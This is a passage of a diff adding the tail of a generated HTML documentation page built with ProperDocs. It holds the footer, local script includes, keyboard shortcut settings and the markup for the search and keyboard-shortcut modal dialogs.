+            </div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+            <p>Documentation built with <a href="https://properdocs.org/">ProperDocs</a>.</p>
+        </footer>
+        <script src="../js/bootstrap.bundle.min.js"></script>
+        <script>
+            var base_url = "..",
+                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
+        </script>
+        <script src="../js/base.js"></script>
+        <script src="../search/main.js"></script>
+
+        <div class="modal" id="properdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="searchModalLabel">Search</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+                <p>From here you can search these documents. Enter your search terms below.</p>
+                <form>
+                    <div class="form-group">
+                        <input type="search" class="form-control" placeholder="Search..." id="properdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="properdocs-search-results" data-no-results-text="No results found"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="properdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
